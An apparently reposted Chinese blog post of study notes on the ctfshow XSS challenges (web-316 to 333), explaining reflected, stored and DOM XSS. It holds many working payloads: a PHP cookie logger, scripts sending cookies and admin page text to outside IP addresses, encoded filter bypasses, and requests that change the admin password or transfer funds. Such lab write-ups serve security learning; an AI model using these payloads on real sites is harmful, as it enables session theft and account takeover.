---
title: ctfshow xss
date: 2025-04-22 20:35:07
tags: xss
categories: 学习笔记
---

### 反射型(非持久化)

（1）原理
  反射型xss又称非持久型xss，是目前最普遍的类型，这种攻击方式往往具有一次性。发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。这个过程像一次反射，所以称反射型XSS。

（2）攻击方式
  攻击者通过电子邮件等方式将包含xss代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接受该用户的请求并进行处理，然后服务器把带有xss代码的数据发送给目标用户的浏览器，浏览器解析这段带有xss代码的恶意脚本后就会触发xss漏洞

### web-316

反射型xss

我们利用vps进行外带

先往vps里写入一个1.php

```php
<?php
	$cookie = $_GET['cookie'];
	$time = date('Y-m-d h:i:s', time());
	$log = fopen("cookie.txt", "a");
	fwrite($log,$time.':    '. $cookie . "\n");
	fclose($log);
?>

```

然后用js语句进行外带

```
<script>location.href="http://60.204.158.87/123/2.php?cookie="+document.cookie</script>
```

此外，也可以

```
<script>window.location.href='http://60.204.158.87/123/2.php?cookie='+document.cookie</script>
<input onfocus="window.open('http://60.204.158.87/123/2.php?cookie='+document.cookie)" autofocus>
<script>window.open('http://60.204.158.87/123/2.php?cookie='+document.cookie)</script>
```



### web-317

这题把script进行了过滤，我们使用img标签

```
<img src="" οnerrοr=location.href="http://60.204.158.87/123/2.php?cookie="+document.cookie>
```



### web-318

我们试试script和img标签，都没有回显

而我们输入`<body>alert(1)</body>`有回显

![image-20250422210717305](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504222107410.png)

```
<body οnlοad=location.href="http://60.204.158.87/123/2.php?cookie="+document.cookie>
<body onload="document.location.href='http://60.204.158.87/123/2.php?cookie='+document.cookie"></body>
<body onload="document.location.href='http://60.204.158.87/123/2.php?cookie='+document.cookie">
<iframe οnlοad=document.location='http://60.204.158.87/123/2.php?cookie='+document.cookie>
```



### web-319 

同318



### web-320

经过测试，他过滤了空格，script，img

xss中空格可以用%09,/**/,/,tab代替

```
<body/**/οnlοad=location.href="http://60.204.158.87/123/2.php?cookie="+document.cookie>
```

扩展：String.formCharCode函数

他可以将ascii码转字符

String.fromCharCode(111,110,108,111,97,100); 控制台运行结果如下：

![image-20250422214141614](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504222141737.png)

用它可以构造一个payload

```
<body/**/οnlοad=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,39,104,116,116,112,58,47,47,49,50,48,46,52,54,46,52,49,46,49,55,51,47,74,97,121,49,55,47,49,50,55,46,112,104,112,63,99,111,111,107,105,101,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,60,47,115,99,114,105,112,116,62));>

```

```
String.fromCharCode(***)`就是`<script>document.location.href='http://120.46.41.173/Jay17/127.php?cookie='+document.cookie</script>
```

下面是字符串转ascii码脚本

```py
input_str = input("请输入字符串: ")  # 获取用户输入的字符串
ascii_list = []

# 遍历字符串，将每个字符转换为ASCII码，并添加到列表中
for char in input_str:
    ascii_code = ord(char)  # 使用ord()函数获取字符的ASCII码
    ascii_list.append(str(ascii_code))  # 将ASCII码转换为字符串并添加到列表

# 将列表中的ASCII码用逗号隔开，并打印结果
result = ','.join(ascii_list)
print("转换后的ASCII码:", result)

```

ascii转字符串

```py
def ascii_to_string(ascii_str):
    # 将以逗号分隔的ASCII码字符串分割成一个列表
    ascii_list = ascii_str.split(',')

    # 使用列表推导式将ASCII码转换为字符，并连接成一个字符串
    result = ''.join(chr(int(code)) for code in ascii_list)
    return result


# 输入以逗号分隔的ASCII码字符串
ascii_str = input("请输入以逗号分隔的ASCII码字符串: ")

# 调用函数进行转换并打印结果
string_result = ascii_to_string(ascii_str)
print("转换后的字符串:", string_result)


```

###  web-321

同320



### web-322

该题过滤了script，img，iframe，xss，空格，分号，逗号

payload

```
<iframe/**/οnlοad=location.href="http://47.98.193.145/1111/127.php?cookie="+document.cookie></iframe>

<svg/**/οnlοad=location.href="http://47.98.193.145/1111/127.php?cookie="+document.cookie>

<body/οnlοad=location.href="http://47.98.193.145/1111/127.php?cookie="+document.cookie>

<input/**/οnfοcus=location.href="http://47.98.193.145/1111/127.php?cookie="+document.cookie>

```

### web 323-326

同web322

反射型到这一题应该就截止了，现在讲讲千奇百怪的payload。

反射型绕过过滤好文：[xss 常用标签及绕过姿势总结 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/340080.html)

**1.利用十进制转实体来绕过**

```
<iframe	WIDTH=0	HEIGHT=0	srcdoc=。。。。。。。。。。&#60;&#115;&#67;&#82;&#105;&#80;&#116;&#32;&#115;&#82;&#67;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#120;&#115;&#46;&#115;&#98;&#47;&#49;&#66;&#113;&#117;&#34;&#62;&#60;&#47;&#115;&#67;&#114;&#73;&#112;&#84;&#62;>

<iframe/srcdoc=。。。。。。。。。。&#60;&#115;&#67;&#82;&#105;&#80;&#116;&#32;&#115;&#82;&#67;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#120;&#115;&#115;&#46;&#112;&#116;&#47;&#99;&#76;&#103;&#70;&#34;&#62;&#60;&#47;&#115;&#67;&#114;&#73;&#112;&#84;&#62;>
```

这个`&#60`其实是十进制的html 实体编码。字符串转十进制的html 实体编码脚本如下：

```py
def string_to_html_entities(input_str):
    html_entities = [f'&#{ord(char)};' for char in input_str]
    result = ''.join(html_entities)
    return result

input_str = input("请输入字符串: ")
html_entities_result = string_to_html_entities(input_str)
print("HTML实体编码:", html_entities_result)

```

<iframe后面的WIDTH和HIGHT其实是设置宽、高等属性，没有也没事



**2.base64编码绕过**

```
<input οnfοcus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzOC5jYy8ySEpJIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw== autofocus>
```

使用atob函数进行base64解码

除了像这种payload这样用，还能像如下这 些payload这样用

```js
<a href=javascript:eval(atob('SmF5MTc='))>test</a>
<a href=javascript:eval(window.atob('SmF5MTc='))>test</a>
<a href=javascript:eval(window['atob']('SmF5MTc='))>test</a>
<img src=x onmouseover="eval(window.atob('SmF5MTc='))">
<img src=x onerror="eval(atob('SmF5MTc='))">
<iframe src="javascript:eval(window['atob']('SmF5MTc='))"></iframe>

```



**3.混合编码绕过**

```
<body/οnlοad=eval("\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x77\x72\x69\x74\x65\x28\x53\x74\x72\x69\x6e\x67\x2e\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65\x28\x36\x30\x2c\x31\x31\x35\x2c\x36\x37\x2c\x31\x31\x34\x2c\x37\x33\x2c\x31\x31\x32\x2c\x31\x31\x36\x2c\x33\x32\x2c\x31\x31\x35\x2c\x31\x31\x34\x2c\x36\x37\x2c\x36\x31\x2c\x34\x37\x2c\x34\x37\x2c\x31\x32\x30\x2c\x31\x31\x35\x2c\x34\x36\x2c\x31\x31\x35\x2c\x39\x38\x2c\x34\x37\x2c\x38\x39\x2c\x38\x34\x2c\x38\x35\x2c\x31\x30\x34\x2c\x36\x32\x2c\x36\x30\x2c\x34\x37\x2c\x31\x31\x35\x2c\x36\x37\x2c\x38\x32\x2c\x31\x30\x35\x2c\x31\x31\x32\x2c\x38\x34\x2c\x36\x32\x29\x29\x3b")>
```

混合编码，加密顺序为先ascii编码加密，再十六进制加密

[字符16进制加密/解密 - 一个工具箱 - 好用的在线工具都在这里！ (atoolbox.net)](http://www.atoolbox.net/Tool.php?Id=816)



```
<body/οnlοad=eval("\u0064\u006F\u0063\u0075\u006D\u0065\u006E\u0074\u002E\u0077\u0072\u0069\u0074\u0065\u0028\u0053\u0074\u0072\u0069\u006E\u0067\u002E\u0066\u0072\u006F\u006D\u0043\u0068\u0061\u0072\u0043\u006F\u0064\u0065\u0028\u0036\u0030\u002C\u0031\u0031\u0035\u002C\u0036\u0037\u002C\u0038\u0032\u002C\u0031\u0030\u0035\u002C\u0038\u0030\u002C\u0031\u0031\u0036\u002C\u0033\u0032\u002C\u0031\u0031\u0035\u002C\u0038\u0032\u002C\u0036\u0037\u002C\u0036\u0031\u002C\u0034\u0037\u002C\u0034\u0037\u002C\u0031\u0032\u0030\u002C\u0031\u0031\u0035\u002C\u0034\u0036\u002C\u0031\u0031\u0035\u002C\u0039\u0038\u002C\u0034\u0037\u002C\u0034\u0039\u002C\u0036\u0036\u002C\u0031\u0031\u0033\u002C\u0031\u0031\u0037\u002C\u0036\u0032\u002C\u0036\u0030\u002C\u0034\u0037\u002C\u0031\u0031\u0035\u002C\u0036\u0037\u002C\u0031\u0031\u0034\u002C\u0037\u0033\u002C\u0031\u0031\u0032\u002C\u0038\u0034\u002C\u0036\u0032\u0029\u0029\u003B")>

```

混合编码，加密顺序为先ascii编码加密，再unicode加密

![image-20250423202518061](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504232025106.png)

![image-20250423202531675](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504232025708.png)

### **存储型 XSS**

（1）原理
  存储型XSS和反射型XSS的差别仅在于，提交的代码会存储在服务器端（数据库、内存、文件系统等），下次请求目标页面时不用再提交XSS代码。最典型的例子就是留言板XSS，用户提交一条包含XSS代码的留言存储到数据库，目标用户查看留言板时，那些留言就会从数据库中加载出来并显示，于是触发了XSS攻击

（2）攻击方式
  这种攻击多见于论坛、博客和留言板中，攻击者在发帖的过程中，将恶意脚本连同正常的信息一起注入帖子的内容中。随着帖子被服务器存储下来，恶意脚本也永久的存放在服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在它们的浏览器中得到执行

### DOM型XSS

(1）原理
  文档对象模型Document Object Model（DOM）是一个与平台、编程语言不相干的接口，允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果会成为展示页面的一部分

DOM型xss其实是一种特殊类型的反射型xss，也被称作本地跨站，它是基于DOM文档对象模型的一种漏洞。DOM XSS和反射型XSS、存储型XSS的区别在于DOM XSS代码并不需要服务器参与，出发XSS靠的是浏览器的DOM解析，完全是客户端的事情

DOM中有很多对象，其中一些对象可以被用户所操纵，如url，location等。客户端的脚本程序可以通过DOM来动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而是从客户端取得DOM中的数据后并在本地执行，因此仅从服务器端是没有办法防御DOM型XSS漏洞的，如若DOM中的数据没有经过严格的验证，便会产生基于DOM的XSS漏洞。

基于DOM的XSS是反射的特例，其中JavaScript隐藏在URL中，并在其呈现时由页面中的JavaScript取出，而不是在提供服务时嵌入到页面中。这可以使其比其他攻击更隐蔽，并且监控页面正文的WAF或其他防护检测不出恶意内容。

（2）攻击方式
  用户请求一个经过专门设计的URL，它由攻击者提交，而且其中包含xss代码。服务器的响应不会以任何的形式包含攻击者的脚本，当用户的浏览器处理这个响应时，DOM对象就会处理xss代码，导致存在xss漏洞


### web-327

从这题开始就是存储型XSS，首先是poster必须是admin才能发送成功，其次就是xss的出发点一个是sender和content都可以

```
<script> onload=location.href="http://47.98.193.145/1111/127.php?cookie="+document.cookie</script>

```

![image-20250423204012730](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504232040763.png)

![image-20250423204022238](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504232040262.png)



### web-328

这里在注册时，用户名和密码都用payload（头这里没用了。可能被过滤了）

打payload前先用vps监听9023端口

```
<script>window.open('http://120.46.41.173:9023/'+document.cookie)</script> 
```

![image-20250423204412630](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504232044662.png)

这个应该是管理员的cookie，抓包伪造一下cookie

![image-20250423204758098](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504232047133.png)

然后放包，一个一个放，速度要慢。放一个包改一次cookie

![image-20250423204843142](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504232048170.png)

```
别人的wp：
TIP：关于异步(加深了解可写项目或看项目)，页面框架获取和数据拉取填充是异步进行的，不在同一个数据包中，如果通过BURP完成此题，请注意数据包是否为获取指定数据。

另外一种思路：
将页面指定部分直接发送到XSS平台
经分析，flag大概率在document.body.innerText，且数据量不大
```



### web-329

这里还是仅管理员可见

![image-20250423205351783](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504232053815.png)

和上题不同的是，这题cookie会立刻失效，不能通过窃取cookie的形式获得flag

 我们来分析一下一原理，我们的payload作为存储型XSS，管理员访问的时候能被我们窃取Cookie，你哈是不是还能窃取到别的东西呢，比如管理员看到的用户名和密码。理论上来说是可以的，所以就直接获取管理员的页面信息

问题在于，我们该如何带出数据？

**方法一：我们可以通过类名查找元素，通过document来获取**

先在vps上面监听端口9023

innerHTML和outerHTML的区别

```
1.innerHTML
从对象的起始位置到终止位置的全部内容，不包括html标签，innerText柯替代innerHTML

2.outerHTML
除了包含innerHTML的全部内容外，还包含标签本身
```

可以看到前端代码中将要显示admin密码的地方类为layui-table-cell laytable-cell-1-0-1

![image-20250423212222717](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504232122756.png)

payload： （作为账号密码注册后登录）

```
<script>window.open('http://120.46.41.173:9023/'+document.getElementsByClassName('layui-table-cell laytable-cell-1-0-1')[1].innerHTML)</script>
```



解释一下

> window.open('http://120.46.41.173:9023/' + document.getElementsByClassName('layui-table-cell laytable-cell-1-0-1')[1].innerHTML) 这是一个调用 window.open() 函数的语句，用于打开新的浏览器窗口。
>
> 'http://120.46.41.173:9023/' 这是一个字符串，表示要打开的网页的 URL。它包括了协议（http://）、主机名（120.46.41.173）和端口号（9023），以及路径（后面的斜杠 /）。
>
> document.getElementsByClassName('layui-table-cell laytable-cell-1-0-1')[1].innerHTML 这是一系列 DOM 操作，用于获取网页中特定元素的内容。
>
> document.getElementsByClassName('layui-table-cell laytable-cell-1-0-1') 是一个通过类名查找元素的方法。它查找具有类名 'layui-table-cell' 和 'laytable-cell-1-0-1' 的元素，通常这是一种针对表格单元格的选择。
>
> [1] 表示从匹配的元素列表中选择第二个元素（JavaScript 中的数组索引从 0 开始）。
>
> .innerHTML 用于获取选定元素的 HTML 内容，也就是在这个表格单元格中显示的文本或 HTML。
> 

![image-20250423212611169](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504232126197.png)



**方法二：jQuery选择器查找类和获取内容**

我们已经得知了我们要获取的数据对应的类名字是layui-table-cell和laytable-cell-1-0-1，对应用户名和密码

这里我们可以只读一个，也可以都读，都读的话.layui-table-cell.laytable-cell-1-0-1，只读一个的话laytable-cell-1-0-1

js中indexof()方法返回值在字符串中第一次出现的位置，如果未找到该值，则indexof()方法返回-1，indexof()方法区分大小写

我们现在控制台测试一下：（能成功获取类和内容就可以了）

```
$('.laytable-cell-1-0-1').each(function(index,value){
	console.log(value);
});
```

![image-20250423215117393](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504232151448.png)

vps监听9023端口

payload:（作为账号密码注册后登录）

```
<script>$('div.layui-table-cell.laytable-cell-1-0-1').each(function(index,value){if(value.innerHTML.indexOf('ctfshow{')>-1){window.location.href='http://120.46.41.173:9023/'+value.innerHTML;}});</script>

```

解释一下它的每一部分：

> $('div.layui-table-cell.laytable-cell-1-0-1').each(function(index, value) { ... });
> 这是一个 jQuery 选择器，它查找具有类名 'layui-table-cell'、'laytable-cell-1-0-1' 的 <div> 元素集合，并对每个元素执行一个函数。
>
> .each(function(index, value) { ... })
> 这是 jQuery 的遍历方法，它会遍历匹配的元素集合，并对每个元素执行包含在函数中的操作。在这里，函数接受两个参数，index 表示当前元素在集合中的索引，value 表示当前元素的引用。
>
> if (value.innerHTML.indexOf('ctfshow{') > -1) { ... }
> 这是在遍历中的条件语句，它检查当前元素的内容是否包含字符串 'ctfshow{'。value.innerHTML 表示当前元素的 HTML 内容，.indexOf('ctfshow{') 用于查找是否包含 'ctfshow{'，如果包含则返回大于 -1 的索引，否则返回 -1。
>
> window.location.href = 'http://120.46.41.173:9023/' + value.innerHTML;
> 如果条件满足，即当前元素的内容包含 'ctfshow{'，则执行这一行代码。它会将浏览器的当前位置重定向到一个新的 URL，这个 URL 是 'http://120.46.41.173:9023/' 加上当前元素的内容。这样就可以在浏览器中打开一个新的页面，新页面的 URL 包含了 'ctfshow{' 以及其他内容。

这里有点小问题，带出来的内容不是flag，而是payload

我们分析一下，猜测他确实把第一个用户的密码给了。但是第一个用户是我刚刚注册的那个，就是我的payload，而且我的payload也包含ctfshow{

验证猜想，我们重新注册了一个号，账号和密码都是ctfshow{i an jay17}，果然，监听的内容就变成了ctfshow{i an jay17}

![image-20250424194749308](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504241947338.png)

所以这题是特殊情况，我们需要改改payload（包含ctfshow{，但是不保护script）

```
<script>$('div.layui-table-cell.laytable-cell-1-0-1').each(function (index, value) {if ((value.innerHTML.indexOf('ctfshow{') > -1)&&(value.innerHTML.indexOf('script') === -1)) {window.location.href = 'http://120.46.41.173:9023/' +value.innerHTML;}});</script>
```

然后就得到flag了

![image-20250424195636798](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504241956844.png)



**方法三：querySelector方法获取内容**

quertSelector是JavaScript中用于从文档中选择一个或多个元素的方法，这个方法允许通过CSS选择器来查找并返回文档中匹配该选择器的第一个元素（如果有多个匹配项，则只返回第一个匹配项）

下面是querySelector方法的解释:

1.基本语法：

```
var element = document.querySelector(selector);
```

selector是一个字符串，表示要查找的元素的css选择器

2.示例

```
// 通过ID选择元素
var elementById = document.querySelector('#myId');
// 通过类名选择元素
var elementsByClass = document.querySelector('.myClass');
// 通过标签名选择元素
var elementsByTagName = document.querySelector('div');
// 使用复杂的选择器，本题就是这种
var complexSelector = document.querySelector('div.container > p:first-child');

```

![image-20250424214045494](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504242140551.png)

payload：其实\#top > div.layui-container能把所有源码都读了，很方便

```
<script>var img = new Image();img.src = "http://120.46.41.173:9023/"+document.querySelector('#top > div.layui-container > div:nth-child(4) > div > div.layui-table-box > div.layui-table-body.layui-table-main').textContent;document.body.append(img);</script>
```

解释一下它的每一部分

> 1.var img = new Image();
>
> 这行代码创建了一个新的图像元素对象，并将其分配给变量 img。这个对象用于在页面上加载图像。
>
> 2.img.src = "http://120.46.41.173:9023/" + document.querySelector('#top > div.layui-container > div:nth-child(4) > div > div.layui-table-box > div.layui-table-body.layui-table-main').textContent;这行代码设置了图像的 src 属性，即要加载的图像的 URL。URL 是通过拼接多个部分构建的：
>
> ​	"http://120.46.41.173:9023/" 是图像的基本 URL。
>
> ​	document.querySelector(...) 是一个 DOM 查询操作，用于获取页面上特定元素的内容。在这里，它获取了一个具有复杂选择器的元素，该元素位于页面的某个位置。它的目的是获取这个元素的文本内容。
>
> ​	textContent 是获取 DOM 元素文本内容的属性。
> 综合起来，这行代码的目的是获取特定 DOM 元素的文本内容，然后将其添加到图像 URL 的末尾，以便通过 URL 传递给服务器。
>
> 3.document.body.append(img);最后一行代码将创建的图像元素 img 添加到页面的 <body> 元素中，这样图像将被加载并显示在页面上。

![image-20250424214854454](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504242148488.png)

来自大佬的补充

```
// 定义sleep函数，转跳，睡眠，接口通信，然而由于机器人不用浏览器未实现，如果是真人则可行
<script>function sleep(numberMillis) {var now = new Date();var exitTime=now.getTime() + numberMillis;while (true) {now = new Date();if (now.getTime() > exitTime)return;}};window.location.href="manager.php";sleep(1000);$('.layui-table-cell.laytable-cell-1-0-1').each(function(index,value){if(value.innerHTML.indexOf('{')>-1){document.location.href='http://xxxxxxxxxxxxxxxxxxxxxxxx/x.php?1='+value.innerHTML;}});</script>

<script>window.open('http://60.204.158.87/'+document.cookie)</script>

```



### web-330

![image-20250428193040147](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504281930240.png)

我们发现多了一个修改密码的功能

我们先抓包看看有啥功能

![image-20250428193143036](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504281931091.png)

我们可以发现修改密码调用了这个请求，于是可以想到直接通过跳转一个get请求来修改管理员密码

```
<script>document.location.href="http://127.0.0.1/api/change.php?p=123456"</script>

```

由于数据库在本地，所以我们可以直接通过修改本地的密码为123456来达到修改admin密码的目的

但我们通过实践发现不能，换成用户名试试

![image-20250428193336081](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504281933114.png)



登录成功，然后又是通过抓包获取flag，但这次是第一个包发送过去就能看到flag

![image-20250428193810007](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504281938041.png)

反而第二个包发过去看不到了



### web-331

和上题一样的情况

同样抓包看看

![image-20250428193858896](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504281938930.png)

我们发现发送形式变成POST了，于是对应的payload也变成post形式

<script>
$.ajax(
	{
		url:'api/change.php',
		type:'post',
		data:{
			p:'123456'
		}
	}
)
</script>

通过f12发现可以修改，于是格式化了一下，得到

```
<script>$.ajax({url:'api/change.php',type:'post',data:{p:'123456'}})</script>

```

![image-20250428194212653](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504281942690.png)



### web-332

这次多出了个汇款功能，我们先注册一个账号

然后转账负数的金额

![image-20250428194535357](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504281945387.png)

就会发现负的太多，余额溢出了变为了正数，然后就能买flag了



### web-333

管理员访问用户管理，用注册的用户名执行js代码给另一个账户转账，所以需要注册两个用户名

转账逻辑：

![image-20250428194736988](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504281947021.png)

同样可以通过测试写一个转账逻辑：

```
<script>
$.ajax(
	{
		url:'api/amount.php',
		type:'post',
		data:{
			u:'123',
			a:'5'
		}
	}
)
</script>

```

经过测试可以，格式化一下变成payload：

```
<script>$.ajax({url:'api/amount.php',type:'post',data:{u:'123',a:'10000'}})</script>
```

![image-20250428194801120](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504281948150.png)

转账成功，😎

购买flag

转载：https://blog.csdn.net/qq_56815564/article/details/131563596
